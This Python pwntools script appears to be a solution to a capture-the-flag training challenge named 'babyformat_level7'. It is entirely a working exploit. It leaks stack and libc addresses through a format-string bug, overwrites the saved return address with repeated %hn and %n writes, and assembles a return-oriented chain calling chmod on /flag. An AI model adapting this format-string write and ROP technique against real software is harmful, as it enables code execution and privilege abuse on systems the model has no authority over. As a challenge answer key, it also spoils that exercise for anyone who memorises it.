from pwn import *
from pwn import *
import struct

io = process("/challenge/babyformat_level7")
rip=1
write=1

def val(hack,  rip):
    # vuln_str = 'a' * 6 + '%09x' * 59
    #print("7 Not returned")
    vuln_str=76*"%09x"

    h1, h2, h3, h4 = (0, int('0x' + hex(hack)[2: 6], 16), int('0x' + hex(hack)[6: 10], 16), int('0x' + hex(hack)[10: 14], 16))

    print(hex(hack), hex(h1), hex(h2), hex(h3), hex(h4))
    packed_str = [(h2, rip + 4), (h3, rip + 2), (h4, rip)]
    packed_str = sorted(packed_str, key = lambda x: x[0])

    print(packed_str)

    prev = 80 + 9*76
    for i in range(len(packed_str)):
        vuln_str += '%0' + str(packed_str[i][0] - prev) + 'x%hn'
        prev = packed_str[i][0]

    # vuln_str += 'A' * 100
    if len(vuln_str)  != 432:
        vuln_str += ('A' * (432 - (len(vuln_str) )))

    vuln_str = vuln_str.encode()

    for i in range(len(packed_str)):
        vuln_str += p64(packed_str[i][1])
        vuln_str += b'a' * 8

    return vuln_str




def wrt(hack,  rip):
    prev =  80 + 20*76
    vuln_str = 76*"%020x"
    vuln_str += '%0' + str(hack - prev) + 'x%na'

    if len(vuln_str)  != 432:
        vuln_str += ('A' * (432 - (len(vuln_str) )))

    vuln_str = vuln_str.encode()
    vuln_str += p64(rip)
    print(vuln_str)
    return vuln_str




def hacker():
    hack = write
    vuln_str = '%010x' * 76

    h1, h2, h3, h4 = (0, int('0x' + hex(hack)[2: 6], 16), int('0x' + hex(hack)[6: 10], 16), int('0x' + hex(hack)[10: 14], 16))
    # print(hex(hack), hex(h1), hex(h2), hex(h3), hex(h4))
    packed_str = [(h2, rip + 4), (h3, rip + 2), (h4, rip)]
    packed_str = sorted(packed_str, key = lambda x: x[0])

    prev = 80+76*10
    for i in range(len(packed_str)):
        vuln_str += '%0' + str(packed_str[i][0] - prev) + 'x%hn'
        prev = packed_str[i][0]

    # vuln_str += 'A' * 100
    if len(vuln_str)  != 432:
        vuln_str += ('A' * (432 - (len(vuln_str) )))

    vuln_str = vuln_str.encode()

    for i in range(len(packed_str)):
        vuln_str += p64(packed_str[i][1])
        vuln_str += b'a' * 8


    # print(vuln_str)
    io.sendline(vuln_str)
    io.recvuntil(b'input again.')

	

io.recvuntil(b'vulnerability:\n')
context.arch = 'amd64'
s=145*"%lx"+(" "+"%lx"+" "+"%lx")
#s="%146$lx %147$lx "
exploit=s.encode()
io.sendline(exploit)
io.recvuntil(b"Your input is:")
io.recvline()
a1=io.recvline(keepends=False)
split_string=a1.split()
rbp_main=int(split_string[1],16)
last_main=int(split_string[2],16)
print(f"rbp_main:{hex(rbp_main)}")
print(f"last_main:{hex(last_main)}")


io.recvuntil(b"exit.")
func_address=last_main-5  #1006
rbp_fun=rbp_main-80
rip_fun=rbp_fun+8
print(f"rip_fun:{hex(rip_fun)}")
print(f"func_address:{hex(func_address)}")
rip=rip_fun
write=func_address
hacker()




#io.recvuntil(b"again.")


puts_got=last_main+10402
#s="%24$s"
#80+64+400
s=72*'%09x'+'%x\n %s'
t=400-len(s)
s+=t*'A'
#s="TTTT"+"%61$s"+"P"+"TTTT"
exploit=s.encode()+p64(puts_got)

io.sendline(exploit)
io.recvuntil(b"Your input is:")
io.recvline()
io.recvline()
a1=io.recvline(keepends=False)[1:-112]
t=struct.unpack('<Q',a1+b"\x00\x00")[0]
print("$$$$$"+hex(t)+"$$$$$")
print(b"$$$$"+a1+b"$$$")
base=t-541728
print(f"base:{hex(base)}")
pop_rdi=0x23b6a+base   #0x23b6a 
pop_rsi=0x2601f+base  #0x2601f
chmod=0x10db60+base
print(f"pop_rdi:{hex(pop_rdi)}")
print(f"pop_rsi:{hex(pop_rsi)}")
print(f"chmod:{hex(chmod)}")

hacker()

rip=rip_fun
n=1
print(f"n:{n}")
io.sendline(wrt(0x7007,rip+24))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#2
print(f"n:{n}")
io.sendline(wrt(0x10000,rip+25))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#3

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+26))
io.recvuntil(b"then exit.")
hacker()
n+=1
#4

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+27))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#5

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+28))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#6

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+29))
io.recvuntil(b"then exit.")
hacker()
n+=1
#7

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+30))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#8

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+31))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#9

print(f"chmod:{hex(chmod)}")
print(f"n:{n}")
io.sendline(val(chmod,rip+32))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#10

print(f"n:{n}")
print(f"pop_rsi:{hex(pop_rsi)}")
io.sendline(val(pop_rsi,rip+16))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#11

print(f"n:{n}")
io.sendline(val(rip-8-1056+80,rip+8))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#12

print(f"n:{n}")
print(f"pop_rdi:{hex(pop_rdi)}")
io.sendline(val(pop_rdi,rip))

io.recvuntil(b"then exit.")
input()
io.sendline(b"/flag\x00")



print("All done")
io.interactive()

